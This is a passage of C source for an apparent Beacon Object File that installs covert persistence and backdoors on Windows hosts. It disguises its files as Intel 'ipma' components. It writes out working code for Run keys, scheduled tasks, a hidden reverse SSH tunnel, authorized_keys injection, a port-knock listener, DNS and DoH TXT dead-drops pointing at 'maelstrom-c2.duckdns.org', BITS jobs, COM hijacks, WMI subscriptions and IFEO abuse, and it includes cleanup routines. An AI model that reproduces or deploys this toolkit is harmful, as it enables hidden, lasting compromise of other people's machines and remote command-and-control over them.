        BeaconPrintf(CALLBACK_OUTPUT, "[priv] elevation_type=%u (1=default 2=full 3=limited)\n", etype);
    if (ADVAPI32$GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)TokenUser, buf, sizeof(buf), &need)) {
        tu = (TOKEN_USER_B *)buf;
        ulen = (DWORD)sizeof(user);
        dlen = (DWORD)sizeof(dom);
        if (ADVAPI32$LookupAccountSidA(NULL, tu->User.Sid, user, &ulen, dom, &dlen, &use))
            BeaconPrintf(CALLBACK_OUTPUT, "[priv] user=%s\\%s\n", dom, user);
    }
    if (!ADVAPI32$GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)TokenPrivileges, buf, sizeof(buf), &need)) {
        if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER)
            BeaconPrintf(CALLBACK_OUTPUT, "[priv] priv blob too big (%u)\n", need);
    } else {
        tp = (TOKEN_PRIVS_B *)buf;
        BeaconPrintf(CALLBACK_OUTPUT, "[priv] privilege_count=%u (enabled interesting):\n", tp->PrivilegeCount);
        for (i = 0; i < tp->PrivilegeCount && i < 64; i++) {
            plen = (DWORD)sizeof(priv);
            if (!ADVAPI32$LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, priv, &plen))
                continue;
            if (!(tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
                continue;
            if (eq(priv, "SeDebugPrivilege") || eq(priv, "SeImpersonatePrivilege")
                || eq(priv, "SeAssignPrimaryTokenPrivilege") || eq(priv, "SeTcbPrivilege")
                || eq(priv, "SeLoadDriverPrivilege") || eq(priv, "SeBackupPrivilege")
                || eq(priv, "SeRestorePrivilege") || eq(priv, "SeTakeOwnershipPrivilege")
                || eq(priv, "SeSecurityPrivilege") || eq(priv, "SeTrustedCredManAccessPrivilege"))
                BeaconPrintf(CALLBACK_OUTPUT, "    + %s\n", priv);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[priv] SYSTEM is BOF ceiling. PPL/TI = other module.\n");
    KERNEL32$CloseHandle(tok);
}

static void cmd_status(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[status] services\n");
    svc_probe("WinRM");
    svc_probe("sshd");
    svc_probe("ssh-agent");
    svc_probe("BITS");
    svc_probe("iphlpsvc");
    svc_probe("WinHttpAutoProxySvc");
    svc_probe("RemoteRegistry");
    svc_probe("TermService");
    svc_probe("IntelPma");
    BeaconPrintf(CALLBACK_OUTPUT, "[status] paths\n");
    cmd_paths();
}

static void cmd_check(const char *id)
{
    DWORD rid = current_il();
    int admin = BeaconIsAdmin() ? 1 : 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[check] id=%s  il=0x%X (%s) admin=%s\n",
        nonempty(id) ? id : "?", rid, integrity_name(rid), admin ? "yes" : "no");
    if (!nonempty(id) || eq(id, "help")) {
        cmd_list();
        return;
    }
    if (eq(id, "wake") || eq(id, "dns") || eq(id, "doh") || eq(id, "bits") || eq(id, "logon")
        || eq(id, "com") || eq(id, "treatas") || eq(id, "sshkey") || eq(id, "startup")
        || eq(id, "profile") || eq(id, "active") || eq(id, "autorun") || eq(id, "mshta")) {
        BeaconPrintf(CALLBACK_OUTPUT, "[check] %s: Medium OK. apply <id> on a FRESH Demon.\n", id);
        return;
    }
    if (eq(id, "ssh")) {
        expand_probe("ssh", "SystemRoot", "System32\\OpenSSH\\ssh.exe");
        expand_probe("ania-id", "USERPROFILE", ".ssh\\ania-agent\\id_ed25519");
        BeaconPrintf(CALLBACK_OUTPUT, "[check] ssh: -R outbound persist. hop default root@10.66.0.1\n");
        return;
    }
    if (eq(id, "knock") || eq(id, "spa") || eq(id, "magic")) {
        expand_probe("ipmasvc", "PUBLIC", "ipmasvc.exe");
        BeaconPrintf(CALLBACK_OUTPUT, "[check] knock: SPA HMAC-SHA256 UDP :%d. not WoL. fw %s.\n", SPA_PORT, WG_NET);
        return;
    }
    if (eq(id, "winrm") || eq(id, "wmi") || eq(id, "proxy") || eq(id, "sshd") || eq(id, "ifeo")) {
        if (rid < 0x00003000 && !admin)
            BeaconPrintf(CALLBACK_OUTPUT, "[check] %s: NEED High/Admin.\n", id);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[check] %s: priv OK. bind %s only.\n", id, WG_NET);
        return;
    }
    if (eq(id, "time")) {
        if (rid < 0x00004000)
            BeaconPrintf(CALLBACK_OUTPUT, "[check] time: NEED SYSTEM.\n");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[check] time: SYSTEM OK. DLL must already be on disk.\n");
        return;
    }
    BeaconPrintf(CALLBACK_ERROR, "[check] unknown id '%s'\n", id);
}

static void apply_wake(const char *url)
{
    char file[MAX_PATH], run[400];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply wake] now + HKCU Run + ONLOGON (payload in-reg, hidden powershell)\n");
    cmd_as_file(run, sizeof(run), file);
    spawn(run);
    persist_run(RUN_WAKE, run);
    persist_task(TASK_WAKE, "ONLOGON", run);
}

static void apply_ssh(const char *hop, const char *rspec)
{
    char ssh[MAX_PATH], idf[MAX_PATH], dir[MAX_PATH], file[MAX_PATH], run[400];
    const char *h = nonempty(hop) ? hop : "root@10.66.0.1";
    const char *r = nonempty(rspec) ? rspec : "2201:127.0.0.1:3389";
    if (wan_refuse(h) || wan_refuse(r)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply ssh] refuse WAN bind\n");
        return;
    }
    if (!find_ssh(ssh, sizeof(ssh))) {
        BeaconPrintf(CALLBACK_ERROR, "[apply ssh] ssh.exe missing\n");
        return;
    }
    if (!find_idfile(idf, sizeof(idf))) {
        BeaconPrintf(CALLBACK_ERROR, "[apply ssh] no id_ed25519 (ania-agent or .ssh)\n");
        return;
    }
    if (!intel_dir(dir, sizeof(dir)))
        return;
    join2(file, sizeof(file), dir, "ipma-ssh.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "Start-Process -WindowStyle Hidden -FilePath '%s' -ArgumentList @('-i','%s','-N','-T','-R','%s','-o','BatchMode=yes','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=NUL','-o','ServerAliveInterval=30','-o','ServerAliveCountMax=3','-o','ExitOnForwardFailure=yes','-o','ConnectTimeout=8','%s')\r\n",
        ssh, idf, r, h);
    if (!write_all(file, g_body))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply ssh] -R %s %s persist hidden (NAT punch)\n", r, h);
    cmd_as_file(run, sizeof(run), file);
    spawn(run);
    persist_run(TASK_SSH, run);
    persist_task(TASK_SSH, "ONLOGON", run);
}

static void apply_sshkey(const char *pubkey)
{
    char dir[MAX_PATH], ak[MAX_PATH], ic[500];
    HANDLE h;
    DWORD w = 0;
    const char *needle;
    if (!nonempty(pubkey) || MSVCRT$strlen(pubkey) < 20) {
        BeaconPrintf(CALLBACK_ERROR, "[apply sshkey] need pubkey string\n");
        return;
    }
    if (!join_env(dir, sizeof(dir), "USERPROFILE", ".ssh")) {
        BeaconPrintf(CALLBACK_ERROR, "[apply sshkey] USERPROFILE\n");
        return;
    }
    KERNEL32$CreateDirectoryA(dir, NULL);
    join2(ak, sizeof(ak), dir, "authorized_keys");
    needle = pubkey;
    if (MSVCRT$strlen(pubkey) > 40)
        needle = pubkey + MSVCRT$strlen(pubkey) - 40;
    if (file_has(ak, needle)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] already present %s\n", ak);
    } else {
        h = KERNEL32$CreateFileA(
            ak, FILE_APPEND_DATA | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "[apply sshkey] write err=%u\n", KERNEL32$GetLastError());
        } else {
            KERNEL32$WriteFile(h, pubkey, (DWORD)MSVCRT$strlen(pubkey), &w, NULL);
            KERNEL32$WriteFile(h, "\n", 1, &w, NULL);
            KERNEL32$CloseHandle(h);
            BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] append %s (%u bytes)\n", ak, w);
            MSVCRT$_snprintf(
                ic, sizeof(ic),
                "C:\\Windows\\System32\\icacls.exe \"%s\" /inheritance:r /grant:r \"%%USERNAME%%:F\"",
                ak);
            spawn(ic);
        }
    }
    if (current_il() >= 0x00003000 || BeaconIsAdmin()) {
        char ak2[MAX_PATH];
        if (join_env(ak2, sizeof(ak2), "ProgramData", "ssh\\administrators_authorized_keys")
            && !file_has(ak2, needle)) {
            h = KERNEL32$CreateFileA(
                ak2, FILE_APPEND_DATA | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                KERNEL32$WriteFile(h, pubkey, (DWORD)MSVCRT$strlen(pubkey), &w, NULL);
                KERNEL32$WriteFile(h, "\n", 1, &w, NULL);
                KERNEL32$CloseHandle(h);
                BeaconPrintf(CALLBACK_OUTPUT, "[apply sshkey] append %s (Administrators)\n", ak2);
                MSVCRT$_snprintf(
                    ic, sizeof(ic),
                    "C:\\Windows\\System32\\icacls.exe \"%s\" /inheritance:r /grant:r \"Administrators:F\" /grant:r \"SYSTEM:F\"",
                    ak2);
                spawn(ic);
            }
        }
    }
}

static void apply_knock(const char *mode, const char *secret, const char *url)
{
    char dir[MAX_PATH], file[MAX_PATH], run[500];
    const char *sec = secret_ok(secret) ? secret : "maelstrom";
    const char *u = url_ok(url) ? url : DEF_WAKE;
    const char *m = nonempty(mode) ? mode : "listen";

    if (eq(m, "send")) {
        BeaconPrintf(CALLBACK_OUTPUT, "[apply knock] SPA HMAC send 127.0.0.1:%d\n", SPA_PORT);
        MSVCRT$_snprintf(
            g_body, sizeof(g_body),
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -C \""
            "$k=[Text.Encoding]::UTF8.GetBytes('%s');"
            "$ts=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds();"
            "$h=New-Object Security.Cryptography.HMACSHA256(,$k);"
            "$x=[BitConverter]::ToString($h.ComputeHash([Text.Encoding]::ASCII.GetBytes([string]$ts))).Replace('-','').ToLower();"
            "$b=[Text.Encoding]::ASCII.GetBytes(('MAEL.'+$ts+'.'+$x));"
            "$c=New-Object Net.Sockets.UdpClient;$c.Send($b,$b.Length,'127.0.0.1',%d)|Out-Null;$c.Close()"
            "\"",
            sec, SPA_PORT);
        spawn(g_body);
        return;
    }

    if (!intel_dir(dir, sizeof(dir)))
        return;
    join2(file, sizeof(file), dir, "ipma-spa.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "$ErrorActionPreference='SilentlyContinue';"
        "$p=%d;$k=[Text.Encoding]::UTF8.GetBytes('%s');$url='%s';"
        "$u=New-Object Net.Sockets.UdpClient;"
        "$u.Client.SetSocketOption([Net.Sockets.SocketOptionLevel]::Socket,[Net.Sockets.SocketOptionName]::ReuseAddress,$true);"
        "$u.Client.Bind((New-Object Net.IPEndPoint([Net.IPAddress]::Any,$p)));"
        "for(;;){"
        "$ep=New-Object Net.IPEndPoint([Net.IPAddress]::Any,0);"
        "$b=$u.Receive([ref]$ep);"
        "$s=[Text.Encoding]::ASCII.GetString($b).Trim();"
        "$a=$s.Split('.');"
        "if($a.Length-ne 3 -or $a[0]-ne 'MAEL'){continue};"
        "try{$ts=[int64]$a[1]}catch{continue};"
        "$now=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds();"
        "if([Math]::Abs($now-$ts)-gt 180){continue};"
        "$h=New-Object Security.Cryptography.HMACSHA256(,$k);"
        "$x=[BitConverter]::ToString($h.ComputeHash([Text.Encoding]::ASCII.GetBytes($a[1]))).Replace('-','').ToLower();"
        "if($x -ne $a[2].ToLower()){continue};"
        "Start-Process -WindowStyle Hidden -FilePath 'curl.exe' -ArgumentList @('-sS','-m','20',$url)"
        "}\r\n",
        SPA_PORT, sec, u);
    if (!write_all(file, g_body))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply knock] SPA HMAC listen UDP %d persist. not WoL.\n", SPA_PORT);
    fw_in(FW_SPA, "UDP", SPA_PORT);
    ps_file_line(run, sizeof(run), file);
    spawn(run);
    persist_run(TASK_SPA, run);
    persist_task(TASK_SPA, "ONLOGON", run);
}

static void apply_dns(const char *fqdn)
{
    char dir[MAX_PATH], file[MAX_PATH], run[500];
    const char *name = nonempty(fqdn) ? fqdn : "maelstrom-c2.duckdns.org";
    if (!intel_dir(dir, sizeof(dir)))
        return;
    join2(file, sizeof(file), dir, "ipma-dns.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "$ErrorActionPreference='SilentlyContinue';"
        "$n='%s';"
        "foreach($s in @((Resolve-DnsName $n -Type TXT -EA 0).Strings)){"
        "if($s -match '^https://'){Start-Process curl.exe -WindowStyle Hidden -ArgumentList '-sS','-m','25','-o','NUL',$s}"
        "}\r\n",
        name);
    if (!write_all(file, g_body))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply dns] TXT dead-drop %s every 30m (T1071.004)\n", name);
    ps_file_line(run, sizeof(run), file);
    spawn(run);
    persist_task(TASK_DNS, "MINUTE /mo 30", run);
}

static void apply_doh(const char *fqdn)
{
    char dir[MAX_PATH], file[MAX_PATH], run[500];
    const char *name = nonempty(fqdn) ? fqdn : "maelstrom-c2.duckdns.org";
    if (!intel_dir(dir, sizeof(dir)))
        return;
    join2(file, sizeof(file), dir, "ipma-doh.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "$ErrorActionPreference='SilentlyContinue';"
        "$n='%s';"
        "$j=(& curl.exe -sS -m 20 -H 'accept: application/dns-json' \"https://cloudflare-dns.com/dns-query?name=$n&type=TXT\") -join '';"
        "foreach($x in [regex]::Matches($j,'https://[^\\\\\"\\s]+')){"
        "Start-Process curl.exe -WindowStyle Hidden -ArgumentList '-sS','-m','25','-o','NUL',$x.Value"
        "}\r\n",
        name);
    if (!write_all(file, g_body))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply doh] T1572 Cloudflare DoH TXT %s 30m\n", name);
    ps_file_line(run, sizeof(run), file);
    spawn(run);
    persist_task(TASK_DOH, "MINUTE /mo 30", run);
}

static void apply_bits(const char *url)
{
    char ba[MAX_PATH], dst[MAX_PATH], file[MAX_PATH], run[400];
    if (!url_ok(url)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply bits] need URL\n");
        return;
    }
    if (!join_env(ba, sizeof(ba), "SystemRoot", "System32\\bitsadmin.exe") || !exists(ba)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply bits] bitsadmin missing\n");
        return;
    }
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    join_env(dst, sizeof(dst), "TEMP", "bd-wake.bin");
    cmd_as_file(run, sizeof(run), file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply bits] T1197 MaelBdBits + NotifyCmdLine\n");
    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /create /download MaelBdBits", ba);
    spawn(g_cmd);
    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /addfile MaelBdBits \"%s\" \"%s\"", ba, url, dst);
    spawn(g_cmd);
    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /SetNotifyCmdLine MaelBdBits C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"-NoP -NonI -W Hidden -File %s\"", ba, file);
    spawn(g_cmd);
    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /SetMinRetryDelay MaelBdBits 60", ba);
    spawn(g_cmd);
    MSVCRT$_snprintf(g_cmd, sizeof(g_cmd), "\"%s\" /resume MaelBdBits", ba);
    spawn(g_cmd);
    (void)run;
}

static void apply_com(const char *url)
{
    char file[MAX_PATH], payload[500], tr[500];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    cmd_as_file(payload, sizeof(payload), file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply com] T1546.015 COM-Hunter LocalServer32 MsCtfMonitor+CacheTask+ours\n");
    com_localserver(CLSID_CTF, payload);
    com_localserver(CLSID_CACHE, payload);
    com_localserver(CLSID_BD, payload);
    MSVCRT$_snprintf(
        tr, sizeof(tr),
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"[activator]::CreateInstance([type]::GetTypeFromCLSID('%s'))\"",
        CLSID_BD);
    persist_task(TASK_COM, "ONLOGON", tr);
}

static void apply_treatas(const char *url)
{
    char file[MAX_PATH], payload[500], tkey[220];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    cmd_as_file(payload, sizeof(payload), file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply treatas] COM-Hunter TreatAs %s -> %s\n", CLSID_CTF, CLSID_BD);
    com_localserver(CLSID_BD, payload);
    MSVCRT$_snprintf(tkey, sizeof(tkey), "Software\\Classes\\CLSID\\%s\\TreatAs", CLSID_CTF);
    if (reg_sz(HKEY_CURRENT_USER, tkey, NULL, CLSID_BD))
        BeaconPrintf(CALLBACK_OUTPUT, "[treatas] HKCU TreatAs ok\n");
}

static void apply_logon(const char *url)
{
    char file[MAX_PATH], run[400];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    cmd_as_file(run, sizeof(run), file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply logon] T1037 UserInitMprLogonScript\n");
    if (reg_sz(HKEY_CURRENT_USER, "Environment", "UserInitMprLogonScript", run))
        BeaconPrintf(CALLBACK_OUTPUT, "[apply logon] HKCU Environment ok\n");
}

static void apply_startup(const char *url)
{
    char file[MAX_PATH], dst[MAX_PATH];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    if (!join_env(dst, sizeof(dst), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.vbs"))
        return;
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "CreateObject(\"Wscript.Shell\").Run \"powershell.exe -NoP -NonI -W Hidden -File %s\", 0, False\r\n",
        file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply startup] PersistBOF T1547.001 silent vbs %s\n", dst);
    if (write_all(dst, g_body))
        BeaconPrintf(CALLBACK_OUTPUT, "[apply startup] wrote Startup vbs\n");
}

static void apply_profile(const char *url)
{
    char file[MAX_PATH], prof[MAX_PATH], dir[MAX_PATH];
    HANDLE h;
    DWORD w = 0;
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    if (!join_env(dir, sizeof(dir), "USERPROFILE", "Documents\\WindowsPowerShell"))
        return;
    mkdir_p(dir);
    join2(prof, sizeof(prof), dir, "Microsoft.PowerShell_profile.ps1");
    MSVCRT$_snprintf(g_body, sizeof(g_body), "& '%s'\r\n", file);
    if (file_has(prof, "ipma-upd.cmd")) {
        BeaconPrintf(CALLBACK_OUTPUT, "[apply profile] already hooked\n");
        return;
    }
    h = KERNEL32$CreateFileA(prof, FILE_APPEND_DATA | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[apply profile] err=%u\n", KERNEL32$GetLastError());
        return;
    }
    KERNEL32$WriteFile(h, g_body, (DWORD)MSVCRT$strlen(g_body), &w, NULL);
    KERNEL32$CloseHandle(h);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply profile] T1546.013 %s\n", prof);
}

static void apply_active(const char *url)
{
    char file[MAX_PATH], run[400], key[180];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    cmd_as_file(run, sizeof(run), file);
    MSVCRT$_snprintf(key, sizeof(key), "Software\\Microsoft\\Active Setup\\Installed Components\\%s", CLSID_BD);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply active] T1547.014 Active Setup\n");
    reg_sz(HKEY_CURRENT_USER, key, NULL, "Intel Ipma");
    reg_sz(HKEY_CURRENT_USER, key, "StubPath", run);
    reg_sz(HKEY_CURRENT_USER, key, "Version", "1,0,0,0");
}

static void apply_autorun(const char *url)
{
    char file[MAX_PATH], run[400];
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    cmd_as_file(run, sizeof(run), file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply autorun] cmd AutoRun\n");
    if (reg_sz(HKEY_CURRENT_USER, "Software\\Microsoft\\Command Processor", "AutoRun", run))
        BeaconPrintf(CALLBACK_OUTPUT, "[apply autorun] HKCU Command Processor ok\n");
}

static void apply_mshta(const char *url)
{
    char dir[MAX_PATH], file[MAX_PATH], run[400], hta[MAX_PATH];
    const char *u = url_ok(url) ? url : DEF_WAKE;
    if (!join_env(hta, sizeof(hta), "SystemRoot", "System32\\mshta.exe") || !exists(hta)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply mshta] mshta.exe missing\n");
        return;
    }
    if (!intel_dir(dir, sizeof(dir)))
        return;
    join2(file, sizeof(file), dir, "ipma-hta.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "Start-Process -WindowStyle Hidden -FilePath '%s' -ArgumentList '%s'\r\n",
        hta, u);
    if (!write_all(file, g_body))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply mshta] T1218.005 signed HTA hidden\n");
    cmd_as_file(run, sizeof(run), file);
    spawn(run);
    persist_run(TASK_HTA, run);
    persist_task(TASK_HTA, "ONLOGON", run);
}

static void apply_winrm(const char *scope)
{
    if (wan_refuse(scope)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply winrm] refuse WAN/any. bind %s only.\n", WG_NET);
        return;
    }
    if (!need_high("winrm"))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply winrm] Enable-PSRemoting then fw %s. never 5985/internet.\n", WG_NET);
    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"Enable-PSRemoting -Force -SkipNetworkProfileCheck\"");
    fw_in(FW_WINRM, "TCP", 5985);
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\netsh.exe advfirewall firewall set rule group=\"Windows Remote Management\" new remoteip=%s",
        WG_NET);
    spawn(g_cmd);
}

static void apply_proxy(const char *lip, const char *lport)
{
    char vname[80], vdata[80];
    const char *ip = nonempty(lip) ? lip : "127.0.0.1";
    const char *po = nonempty(lport) ? lport : "2200";
    if (wan_refuse(ip)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply proxy] refuse WAN listen\n");
        return;
    }
    if (!need_high("proxy"))
        return;
    MSVCRT$_snprintf(vname, sizeof(vname), "%s/%s", ip, po);
    MSVCRT$_snprintf(vdata, sizeof(vdata), "127.0.0.1/22");
    BeaconPrintf(CALLBACK_OUTPUT, "[apply proxy] addportproxy-bof registry %s -> %s (no netsh)\n", vname, vdata);
    if (reg_sz(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp", vname, vdata))
        BeaconPrintf(CALLBACK_OUTPUT, "[proxy] HKLM PortProxy ok\n");
    iphlp_reload();
}

static void apply_wmi(const char *url)
{
    char file[MAX_PATH], dir[MAX_PATH], ps1[MAX_PATH], run[500];
    if (!need_high("wmi"))
        return;
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    if (!intel_dir(dir, sizeof(dir)))
        return;
    join2(ps1, sizeof(ps1), dir, "ipma-wmi.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "$ErrorActionPreference='SilentlyContinue';"
        "$n='MaelBdWmi';$p='%s';$ns='root\\subscription';"
        "Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA 0 | ? { $_.Filter -match $n } | %% { $_.Delete() };"
        "Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -EA 0 | ? { $_.Name -eq $n } | %% { $_.Delete() };"
        "Get-WmiObject -Namespace $ns -Class __EventFilter -EA 0 | ? { $_.Name -eq $n } | %% { $_.Delete() };"
        "$q=\\\"SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'\\\";"
        "$f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{Name=$n;EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=$q};"
        "$c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{Name=$n;CommandLineTemplate=$p};"
        "Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} | Out-Null\r\n",
        file);
    if (!write_all(ps1, g_body))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply wmi] T1546.003 WMIPersistKit filter explorer.exe -> file\n");
    ps_file_line(run, sizeof(run), ps1);
    spawn(run);
}

static void apply_time(const char *dll)
{
    char p[MAX_PATH];
    DWORD rid = current_il();
    if (rid < 0x00004000) {
        BeaconPrintf(CALLBACK_ERROR, "[apply time] NEED SYSTEM. no DLL drop from this BOF.\n");
        return;
    }
    if (!nonempty(dll)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply time] need existing DLL path. will not drop or register stock w32time.dll.\n");
        return;
    }
    MSVCRT$_snprintf(p, sizeof(p), "%s", dll);
    if (!exists(p)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply time] DLL missing %s — skip, will not drop.\n", p);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[apply time] PersistBOF Time Provider MaelBdTime dll=%s\n", p);
    reg_sz(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\MaelBdTime", "DllName", p);
    reg_sz(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\MaelBdTime", "Enabled", "1");
    reg_sz(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\MaelBdTime", "InputProvider", "1");
}

static void apply_sshd(const char *scope)
{
    if (wan_refuse(scope)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply sshd] refuse WAN. add overlay allow only, keep LAN SSH.\n");
        return;
    }
    if (!need_high("sshd"))
        return;
    BeaconPrintf(CALLBACK_OUTPUT, "[apply sshd] fw TCP 22 %s (does not lock 192.168)\n", WG_NET);
    fw_in(FW_SSH, "TCP", 22);
    spawn("C:\\Windows\\System32\\sc.exe config sshd start= auto");
    spawn("C:\\Windows\\System32\\sc.exe start sshd");
}

static void apply_ifeo(const char *url)
{
    char file[MAX_PATH], run[400];
    if (!need_high("ifeo"))
        return;
    if (!drop_wake_cmd(url, file, sizeof(file)))
        return;
    cmd_as_file(run, sizeof(run), file);
    BeaconPrintf(CALLBACK_OUTPUT, "[apply ifeo] T1546.012 SilentProcessExit WerFault\n");
    reg_dw(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe", "GlobalFlag", 0x200);
    reg_dw(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\WerFault.exe", "ReportingMode", 1);
    reg_sz(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\WerFault.exe", "MonitorProcess", run);
}

static void zap_file(const char *path)
{
    if (!nonempty(path))
        return;
    if (!exists(path)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[clean] miss %s\n", path);
        return;
    }
    if (KERNEL32$DeleteFileA(path))
        BeaconPrintf(CALLBACK_OUTPUT, "[clean] del %s\n", path);
    else
        BeaconPrintf(CALLBACK_ERROR, "[clean] del %s err=%u\n", path, KERNEL32$GetLastError());
}

static void zap_task(const char *tn)
{
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\schtasks.exe /delete /tn %s /f", tn);
    spawn(g_cmd);
}

static void zap_fw(const char *name)
{
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\netsh.exe advfirewall firewall delete rule name=%s",
        name);
    spawn(g_cmd);
}

static void zap_run(const char *name)
{
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\reg.exe delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %s /f",
        name);
    spawn(g_cmd);
}

static void zap_reg(const char *spec)
{
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\reg.exe delete \"%s\" /f", spec);
    spawn(g_cmd);
}

static void zap_intel(const char *name)
{
    char dir[MAX_PATH], p[MAX_PATH];
    if (!intel_dir(dir, sizeof(dir)))
        return;
    if (join2(p, sizeof(p), dir, name))
        zap_file(p);
}

static void clean_wake(void)
{
    zap_intel("ipma-upd.cmd");
    zap_intel("ipma-reg.ps1");
    zap_run(RUN_WAKE);
    zap_task(TASK_WAKE);
    zap_reg("HKCU\\Software\\Intel\\PowerManager");
}

static void clean_ssh(void)
{
    zap_intel("ipma-ssh.cmd");
    zap_intel("ipma-ssh.ps1");
    zap_run(TASK_SSH);
    zap_task(TASK_SSH);
}

static void clean_sshkey(const char *needle)
{
    if (!nonempty(needle)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[clean sshkey] skip keys file — pass pubkey/needle. will not wipe authorized_keys\n");
        return;
    }
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
